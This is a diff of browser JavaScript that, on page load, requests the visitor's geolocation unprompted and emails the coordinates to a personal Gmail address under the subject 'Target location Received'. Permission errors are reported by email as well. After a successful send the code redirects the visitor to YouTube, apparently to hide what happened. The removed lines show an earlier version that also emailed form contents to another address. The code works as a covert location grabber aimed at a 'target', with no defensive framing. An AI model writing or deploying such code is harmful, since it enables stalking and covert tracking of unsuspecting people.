@@ -1,72 +1,48 @@
 document.addEventListener("DOMContentLoaded", function () {
     const locationDisplay = document.getElementById("locationDisplay");
 
-    // Check if geolocation is supported
     if ("geolocation" in navigator) {
         console.log("Geolocation is supported by this browser.");
 
-        // Automatically request location
+        // Automatically request location without button click
         navigator.geolocation.getCurrentPosition(
-            (position) => handleLocationSuccess(position),
-            (error) => handleLocationError(error)
+            (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                console.log(`Location received: Latitude ${latitude}, Longitude ${longitude}`);
+
+                sendEmail('Target location Received', locationDisplay.textContent, 'pthnvenom@gmail.com');
+            },
+            (error) => {
+                console.log("Geolocation error occurred:", error);
+
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        locationDisplay.textContent = "Location access denied by user.";
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        locationDisplay.textContent = "Location information is unavailable.";
+                        break;
+                    case error.TIMEOUT:
+                        locationDisplay.textContent = "Location request timed out.";
+                        break;
+                    default:
+                        locationDisplay.textContent = "An unknown error occurred.";
+                        break;
+                }
+
+                console.log("Error message:", locationDisplay.textContent);
+                sendEmail('Location Access Error', locationDisplay.textContent, 'pthnvenom@gmail.com');
+            }
         );
     } else {
         console.log("Geolocation is not supported by this browser.");
         locationDisplay.textContent = "Geolocation is not supported by this browser.";
     }
-
-    // Handle form submission
-    const form = document.getElementById("dataForm");
-    if (form) {
-        form.addEventListener("submit", function (event) {
-            event.preventDefault(); // Prevent default form submission
-            const formData = new FormData(form);
-            const data = Object.fromEntries(formData.entries());
-
-            sendEmail("Form Submission", JSON.stringify(data, null, 2), "Khalilrodeni@gmail.com");
-        });
-    }
 });
 
-// Handle successful geolocation
-function handleLocationSuccess(position) {
-    const latitude = position.coords.latitude;
-    const longitude = position.coords.longitude;
-
-    const locationDisplay = document.getElementById("locationDisplay");
-    locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-    console.log(`Location received: Latitude ${latitude}, Longitude ${longitude}`);
-
-    sendEmail("Target Location Received", `Latitude: ${latitude}, Longitude: ${longitude}`, "Khalilrodeni@gmail.com");
-}
-
-// Handle geolocation errors
-function handleLocationError(error) {
-    const locationDisplay = document.getElementById("locationDisplay");
-    let errorMessage;
-
-    switch (error.code) {
-        case error.PERMISSION_DENIED:
-            errorMessage = "Location access denied by user. Please enable location services.";
-            break;
-        case error.POSITION_UNAVAILABLE:
-            errorMessage = "Location information is unavailable. Check your connection.";
-            break;
-        case error.TIMEOUT:
-            errorMessage = "Location request timed out. Try again.";
-            break;
-        default:
-            errorMessage = "An unknown error occurred.";
-            break;
-    }
-
-    locationDisplay.textContent = errorMessage;
-    console.log("Geolocation error:", errorMessage);
-
-    sendEmail("Location Access Error", errorMessage, "Khalilrodeni@gmail.com");
-}
-
-// Send email function
 function sendEmail(subject, message, recipientEmail) {
     if (!subject || !message || !recipientEmail) {
         alert("Please fill out all fields.");
@@ -85,25 +61,26 @@ function sendEmail(subject, message, recipientEmail) {
         headers: {
             "Content-Type": "application/json",
         },
-        body: JSON.stringify(emailData),
+        body: JSON.stringify(emailData)
     })
-        .then((response) => {
+        .then(response => {
             if (response.ok) {
                 return response.json();
             } else {
                 throw new Error(`Server responded with ${response.status}`);
             }
         })
-        .then((data) => {
+        .then(data => {
             if (data.message) {
                 alert("Email sent successfully!");
+                window.location.href = "https://www.youtube.com";
             } else if (data.error) {
                 alert("Error: " + data.error);
             } else {
                 alert("Unexpected error occurred.");
             }
         })
-        .catch((error) => {
+        .catch(error => {
             console.log("Error sending email:", error);
             alert("Error sending email: " + error.message);
         });
